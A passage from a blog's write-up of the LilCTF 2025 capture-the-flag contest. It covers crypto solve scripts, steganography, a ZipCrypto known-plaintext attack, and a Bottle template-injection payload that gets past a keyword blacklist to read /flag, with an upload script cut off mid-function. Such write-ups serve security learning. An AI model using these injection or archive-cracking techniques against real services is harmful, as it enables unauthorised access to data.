@@ -1,0 +1,804 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>LilCTF2025 WriteUp | QingChenyou | Luda' Blog</title><meta name="author" content="qingchenyou"><meta name="copyright" content="qingchenyou"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="LilCTF 2025 WPTeam: Im_@tEa_P0t   cryptoez_math exp： Sage Cell运行： from sage.all import *  p &#x3D; 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LilCTF2025 WriteUp">
+<meta property="og:url" content="https://blog.qingchenyou.asia/CTF-WriteUP/LilCTF_wp/index.html">
+<meta property="og:site_name" content="QingChenyou | Luda&#39; Blog">
+<meta property="og:description" content="LilCTF 2025 WPTeam: Im_@tEa_P0t   cryptoez_math exp： Sage Cell运行： from sage.all import *  p &#x3D; 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/%E5%A4%B4%E5%83%8F.jpg">
+<meta property="article:published_time" content="2025-08-18T08:28:46.490Z">
+<meta property="article:modified_time" content="2025-08-18T08:37:58.022Z">
+<meta property="article:author" content="qingchenyou">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/%E5%A4%B4%E5%83%8F.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.qingchenyou.asia/CTF-WriteUP/LilCTF_wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'LilCTF2025 WriteUp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-08-18 16:37:58',
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="https://cdn2.codesign.qq.com/icons/XMx86jzlQw0brz3/latest/iconfont.css"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="/css/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="/css/icat_change.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/%E5%A4%B4%E5%83%8F.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/v2-c54e6e9c538f4bd3bed3021269ea5c33_r.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">QingChenyou | Luda' Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">LilCTF2025 WriteUp</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">LilCTF2025 WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-18T08:28:46.490Z" title="发表于 2025-08-18 16:28:46">2025-08-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-18T08:37:58.022Z" title="更新于 2025-08-18 16:37:58">2025-08-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-WriteUP/">CTF_WriteUP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="LilCTF-2025-WP"><a href="#LilCTF-2025-WP" class="headerlink" title="LilCTF 2025 WP"></a>LilCTF 2025 WP</h1><p>Team: Im_@tEa_P0t</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250818163705002.png" alt="image-20250818163705002"></p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250818163744141.png" alt="image-20250818163744141"></p>
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h5 id="ez-math"><a href="#ez-math" class="headerlink" title="ez_math"></a>ez_math</h5><p><img src="https://lingc-1331223348.cos.ap-chengdu.myqcloud.com/IMG_202508229_100842209.jpg" alt="IMG_202508229_100842209"></p>
+<p><strong>exp：</strong></p>
+<p>Sage Cell运行：</p>
+<pre><code class="highlight python"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *
+
+p = <span class="number">9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161</span>
+<span class="comment">#GF(p)：为矩阵创造有限域，保障矩阵可逆运算</span>
+C = Matrix(GF(p), [
+    [<span class="number">7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645</span>, <span class="number">7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801</span>],
+    [<span class="number">7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808</span>, <span class="number">2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872</span>]
+])
+
+<span class="comment">#C特征值</span>
+eigenvalues = C.eigenvalues()
+lambda1, lambda2 = eigenvalues
+
+<span class="built_in">print</span>(<span class="string">f&quot;Lambda1: <span class="subst">&#123;lambda1&#125;</span>&quot;</span>)
+<span class="built_in">print</span>(<span class="string">f&quot;Lambda2: <span class="subst">&#123;lambda2&#125;</span>&quot;</span>)</code></pre>
+
+<pre><code class="highlight python">lambda1 = <span class="number">461081882199191304136043558055592717274072444511548267131743</span>
+lambda2 = <span class="number">310431440615324582056084165589022472378402725080813836002613</span>
+
+hex1 = <span class="built_in">hex</span>(lambda1)[<span class="number">2</span>:]
+hex2 = <span class="built_in">hex</span>(lambda2)[<span class="number">2</span>:]
+
+bytes1 = <span class="built_in">bytes</span>.fromhex(hex1)
+bytes2 = <span class="built_in">bytes</span>.fromhex(hex2)
+
+flag=bytes1 + bytes2
+<span class="built_in">print</span>(flag)</code></pre>
+
+
+
+<h5 id="mid-math"><a href="#mid-math" class="headerlink" title="mid_math"></a>mid_math</h5><p><img src="https://lingc-1331223348.cos.ap-chengdu.myqcloud.com/IMG_202508229_100842193.jpg" alt="IMG_202508229_100842193"></p>
+<p><strong>exp:</strong></p>
+<p>Sage Cell 运行得到key</p>
+<pre><code class="highlight python">p = <span class="number">14668080038311483271</span>
+P = GF(p)
+
+C_list = [
+    [<span class="number">11315841881544731102</span>, <span class="number">2283439871732792326</span>, <span class="number">6800685968958241983</span>, <span class="number">6426158106328779372</span>, <span class="number">9681186993951502212</span>],
+    [<span class="number">4729583429936371197</span>, <span class="number">9934441408437898498</span>, <span class="number">12454838789798706101</span>, <span class="number">1137624354220162514</span>, <span class="number">8961427323294527914</span>],
+    [<span class="number">12212265161975165517</span>, <span class="number">8264257544674837561</span>, <span class="number">10531819068765930248</span>, <span class="number">4088354401871232602</span>, <span class="number">14653951889442072670</span>],
+    [<span class="number">6045978019175462652</span>, <span class="number">11202714988272207073</span>, <span class="number">13562937263226951112</span>, <span class="number">6648446245634067896</span>, <span class="number">13902820281072641413</span>],
+    [<span class="number">1046075193917103481</span>, <span class="number">3617988773170202613</span>, <span class="number">3590111338369894405</span>, <span class="number">2646640112163975771</span>, <span class="number">5966864698750134707</span>]
+]
+
+D_list = [
+    [<span class="number">1785348659555163021</span>, <span class="number">3612773974290420260</span>, <span class="number">8587341808081935796</span>, <span class="number">4393730037042586815</span>, <span class="number">10490463205723658044</span>],
+    [<span class="number">10457678631610076741</span>, <span class="number">1645527195687648140</span>, <span class="number">13013316081830726847</span>, <span class="number">12925223531522879912</span>, <span class="number">5478687620744215372</span>],
+    [<span class="number">9878636900393157276</span>, <span class="number">13274969755872629366</span>, <span class="number">3231582918568068174</span>, <span class="number">7045188483430589163</span>, <span class="number">5126509884591016427</span>],
+    [<span class="number">4914941908205759200</span>, <span class="number">7480989013464904670</span>, <span class="number">5860406622199128154</span>, <span class="number">8016615177615097542</span>, <span class="number">13266674393818320551</span>],
+    [<span class="number">3005316032591310201</span>, <span class="number">6624508725257625760</span>, <span class="number">7972954954270186094</span>, <span class="number">5331046349070112118</span>, <span class="number">6127026494304272395</span>]
+]
+
+C = matrix(P, C_list)
+D = matrix(P, D_list)
+
+eigen_C = C.eigenvalues()
+eigen_D = D.eigenvalues()
+
+<span class="comment"># 筛选非零特征值,嘻嘻实际上e是0</span>
+c_list = [c <span class="keyword">for</span> c <span class="keyword">in</span> eigen_C <span class="keyword">if</span> c != <span class="number">0</span>]
+d_list = [d <span class="keyword">for</span> d <span class="keyword">in</span> eigen_D <span class="keyword">if</span> d != <span class="number">0</span>]
+
+<span class="comment"># 求解离散对数并验证</span>
+possible_keys = []
+<span class="keyword">for</span> c <span class="keyword">in</span> c_list:
+    <span class="keyword">for</span> d <span class="keyword">in</span> d_list:
+        <span class="keyword">try</span>:
+            <span class="comment"># 求解l^k = m的离散对数k</span>
+            k = discrete_log(d, c)
+            <span class="comment"># 验证是否满足C^k = D</span>
+            <span class="keyword">if</span> C^k == D:
+                possible_keys.append(k)
+                <span class="built_in">print</span>(<span class="string">f&quot;找到密钥: <span class="subst">&#123;k&#125;</span>&quot;</span>)
+        <span class="keyword">except</span>:
+            <span class="keyword">continue</span></code></pre>
+
+<p>第二步AES解密</p>
+<pre><code class="highlight python"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES
+<span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> *
+<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *
+
+key = <span class="number">5273966641785501202</span>
+
+msg = <span class="string">b&quot;\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m&#x27;\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j&quot;</span>
+
+
+key_bytes = long_to_bytes(key)
+key_padded = pad(key_bytes, <span class="number">16</span>)
+
+aes = AES.new(key_padded, AES.MODE_ECB)
+flag = unpad(aes.decrypt(msg), <span class="number">64</span>)
+
+<span class="built_in">print</span>(flag.decode())</code></pre>
+
+
+
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h5 id="是谁没有阅读参赛须知？"><a href="#是谁没有阅读参赛须知？" class="headerlink" title="是谁没有阅读参赛须知？"></a>是谁没有阅读参赛须知？</h5><p>点进去网站之后开f12查找即可</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250815100411394.png" alt="image-20250815100411394"></p>
+<h5 id="PNG-Master"><a href="#PNG-Master" class="headerlink" title="PNG Master"></a>PNG Master</h5><p>题目提示LSB隐写，直接用zsteg查</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816170554981.png" alt="image-20250816170554981"></p>
+<p>看到两个base64编码，拿到flag的一二部分</p>
+<p>然后还发现有一个zlib，提取出来用python脚本解压得到一个压缩包</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816170709135.png" alt="image-20250816170709135"></p>
+<p>压缩包里面有两个文件，打开hint.txt查看</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816170735625.png" alt="image-20250816170735625"></p>
+<p>是零宽位符隐写，解一下</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816170814778.png" alt="image-20250816170814778"></p>
+<p>按照这个上面的说，将secret.bin与secret进行xor</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+
+<span class="keyword">def</span> <span class="title function_">xor_with_filename</span>(<span class="params">data: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:
+    <span class="keyword">return</span> <span class="built_in">bytes</span>([b ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data)])
+
+filename = <span class="string">&quot;secret.bin&quot;</span>
+<span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:
+    data = f.read()
+
+<span class="comment"># 取文件名（不含扩展名）</span>
+basename = os.path.splitext(os.path.basename(filename))[<span class="number">0</span>] 
+key = basename.encode()
+
+<span class="comment"># XOR</span>
+decoded = xor_with_filename(data, key)
+
+<span class="comment"># 保存结果</span>
+outname = <span class="string">&quot;decoded_out&quot;</span>
+<span class="keyword">with</span> <span class="built_in">open</span>(outname, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:
+    f.write(decoded)
+
+<span class="built_in">print</span>(<span class="string">f&quot;[+] 已保存到 <span class="subst">&#123;outname&#125;</span>&quot;</span>)
+<span class="built_in">print</span>(<span class="string">&quot;前100字节预览：&quot;</span>, decoded[:<span class="number">100</span>])</code></pre>
+
+<p>得到base64解开得第三部分flag</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816170929873.png" alt="image-20250816170929873"></p>
+<p>得到flag</p>
+<p><strong>LILCTF{Y0u_4r3_Mas7er_in_PNG}</strong></p>
+<h5 id="提前放出附件"><a href="#提前放出附件" class="headerlink" title="提前放出附件"></a>提前放出附件</h5><p>首先拿到一个压缩包，有密码，不是伪加密</p>
+<p>于是分析压缩包结构</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816185754697.png" alt="image-20250816185754697"></p>
+<p>发现 ZipCrypto Store，首先想到明文攻击</p>
+<p>（其实很没头绪，卡了半天）</p>
+<p>突然想到文件这么小里面一定是明文大概率不是base64</p>
+<p>所以制造一个包含<code>LILCTF&#123;</code>的<code>flag.txt</code>的明文文件进行攻击</p>
+<p>生成制作脚本</p>
+<pre><code class="highlight python"><span class="keyword">import</span> tarfile
+<span class="keyword">import</span> io
+
+<span class="comment"># 1. 猜测在 tar 包里的文件名</span>
+FILENAME_IN_TAR = <span class="string">&quot;flag.txt&quot;</span> 
+
+<span class="comment"># 2. 您已知的、文件开头的内容</span>
+KNOWN_CONTENT = <span class="string">b&quot;LILCTF&#123;&quot;</span>
+
+<span class="comment"># 3. 生成的用于攻击的明文文件名</span>
+OUTPUT_FILENAME = <span class="string">&quot;plaintext.bin&quot;</span>
+
+<span class="comment"># 4. 文件在tar包中的虚拟大小 (这个值现在可以设置得大一些，没关系)</span>
+FILE_SIZE = <span class="number">2048</span> <span class="comment"># 例如设置为和你的密文文件一样大</span>
+
+<span class="comment"># 5. 【重要】我们实际需要写入文件的字节数，用于攻击</span>
+<span class="comment">#     这个值必须小于你的密文大小(2048字节)，64字节已足够</span>
+BYTES_FOR_ATTACK = <span class="number">64</span>
+
+<span class="keyword">def</span> <span class="title function_">create_tar_in_memory</span>():
+    <span class="string">&quot;&quot;&quot;</span>
+<span class="string">    在内存中创建一个虚拟的tar文件流，并返回其二进制内容。</span>
+<span class="string">    &quot;&quot;&quot;</span>
+    in_memory_tar = io.BytesIO()
+    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(fileobj=in_memory_tar, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:
+        tarinfo = tarfile.TarInfo(name=FILENAME_IN_TAR)
+        tarinfo.size = FILE_SIZE
+        file_content = KNOWN_CONTENT.ljust(FILE_SIZE, <span class="string">b&#x27;\x00&#x27;</span>)
+        tar.addfile(tarinfo, io.BytesIO(file_content))
+    in_memory_tar.seek(<span class="number">0</span>)
+    <span class="keyword">return</span> in_memory_tar.read()
+
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    <span class="built_in">print</span>(<span class="string">&quot;正在生成用于已知明文攻击的精确 tar 文件头...&quot;</span>)
+    
+    <span class="comment"># 获取内存中完整的虚拟tar文件数据</span>
+    full_tar_data = create_tar_in_memory()
+    
+    <span class="comment"># 【修正点】我们只截取开头的一小部分用于攻击</span>
+    plaintext_data_for_attack = full_tar_data[:BYTES_FOR_ATTACK]
+    
+    <span class="keyword">with</span> <span class="built_in">open</span>(OUTPUT_FILENAME, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:
+        f.write(plaintext_data_for_attack)
+        
+    <span class="built_in">print</span>(<span class="string">f&quot;成功！已生成 &#x27;<span class="subst">&#123;OUTPUT_FILENAME&#125;</span>&#x27;，大小为 <span class="subst">&#123;<span class="built_in">len</span>(plaintext_data_for_attack)&#125;</span> 字节。&quot;</span>)
+</code></pre>
+
+<p>使用bkcrack用这个制作好的文件进行明文攻击</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816190129793.png" alt="image-20250816190129793"></p>
+<p>得到密钥，进行解密</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816190151594.png" alt="image-20250816190151594"></p>
+<p>得到解密后的文件，打开就是flag</p>
+<p><strong>LILCTF{Z1pCRyp70_1s_n0t_5ecur3}</strong></p>
+<h5 id="v我50-R-MB-赛后"><a href="#v我50-R-MB-赛后" class="headerlink" title="v我50(R)MB[赛后]"></a>v我50(R)MB[赛后]</h5><p>（赛中卡了好久啊，看题目还一直以为图片不在原位置）</p>
+<p>访问网站后发现长度被限制了</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250818163348389.png" alt="image-20250818163348389"></p>
+<p>去掉限制就可以了</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250818163532485.png" alt="image-20250818163532485"></p>
+<p><strong>得到flag</strong></p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250818163617681.png" alt="image-20250818163617681"></p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h5 id="ez-bottle"><a href="#ez-bottle" class="headerlink" title="ez_bottle"></a>ez_bottle</h5><p>题目后端用的是 Bottle 框架和 SimpleTemplate 模板，上传 ZIP 解压后访问 <code>/view/&lt;md5&gt;/&lt;filename&gt;</code>，模板会直接执行 Python 代码。过滤 <code>&#123;&#125;</code>、<code>os</code>、<code>open</code>、<code>_</code>、<code>&lt;</code>、<code>&gt;</code> 等关键字，flag 存在 <code>/flag</code></p>
+<p>起初想用 <code>open(&#39;/flag&#39;).read()</code> 或 <code>os.popen(&#39;cat /flag&#39;)</code> 读取文件，直接被黑名单拦截。模板支持 <code>%</code> 执行 Python 语句，<code>&#123;&#123;expr&#125;&#125;</code> 输出表达式，由于 <code>&#123;&#125;</code> 被封只能用 <code>%</code>。思路改成利用 <code>include()</code> 包含文件，不用显式读文件。<code>include()</code> 查找路径由 <code>TEMPLATE_PATH</code> 控制，如果把它改为 <code>/</code>，再 <code>include(&#39;flag&#39;)</code> 就能输出 <code>/flag</code> 内容。<code>TEMPLATE_PATH</code> 有下划线无法直接写，用 <code>chr()</code> 拼字符串再通过 <code>setattr()</code> 修改即可</p>
+<p>最终生成的模板三行代码：</p>
+<pre><code class="highlight plaintext">% import bottle
+% setattr(bottle, chr(84)+chr(69)+chr(77)+chr(80)+chr(76)+chr(65)+chr(84)+chr(69)+chr(95)+chr(80)+chr(65)+chr(84)+chr(72), [&#x27;/&#x27;])
+% include(&#x27;f&#x27;+&#x27;lag&#x27;)</code></pre>
+
+<p>第一行导入 bottle，第二行修改模板路径到根目录，第三行包含 flag 文件，全程绕过黑名单</p>
+<pre><code class="highlight python"><span class="keyword">import</span> io
+<span class="keyword">import</span> zipfile
+<span class="keyword">import</span> requests
+
+<span class="keyword">def</span> <span class="title function_">build_archive</span>() -&gt; io.BytesIO:
+    template_code = (
+        <span class="string">&quot;% import bottle\n&quot;</span>
+        <span class="string">&quot;% setattr(bottle, &quot;</span>
+        <span class="string">&quot;chr(84)+chr(69)+chr(77)+chr(80)+chr(76)+chr(65)+chr(84)+chr(69)&quot;</span>
+        <span class="string">&quot;+chr(95)+&quot;</span>
+        <span class="string">&quot;chr(80)+chr(65)+chr(84)+chr(72), [&#x27;/&#x27;])\n&quot;</span>
+        <span class="string">&quot;% include(&#x27;f&#x27;+&#x27;lag&#x27;)\n&quot;</span>
+    )
+    memory_buffer = io.BytesIO()
+    <span class="keyword">with</span> zipfile.ZipFile(memory_buffer, <span class="string">&quot;w&quot;</span>, zipfile.ZIP_DEFLATED) <span class="keyword">as</span> archive:
+        archive.writestr(<span class="string">&quot;data.tpl&quot;</span>, template_code)
+    memory_buffer.seek(<span class="number">0</span>)
+    <span class="keyword">return</span> memory_buffer
+
+<span class="keyword">def</span> <span class="title function_">process_transfer</span>(<span class="params">target_addr: <span class="built_in">str</span></span>):
+    archive_data = build_archive()
+    transfer_files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;data.zip&quot;</span>, archive_data, <span class="string">&quot;application/zip&quot;</span>)&#125;
+    <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在向目标 <span class="subst">&#123;target_addr&#125;</span> 传输文件...&quot;</span>)
+
+    <span class="keyword">try</span>:
+        server_resp = requests.post(
+            target_addr,
+            files=transfer_files,
+            timeout=<span class="number">20</span>,
+            headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>&#125;
+        )
+
+        <span class="keyword">if</span> server_resp.status_code != <span class="number">200</span>:
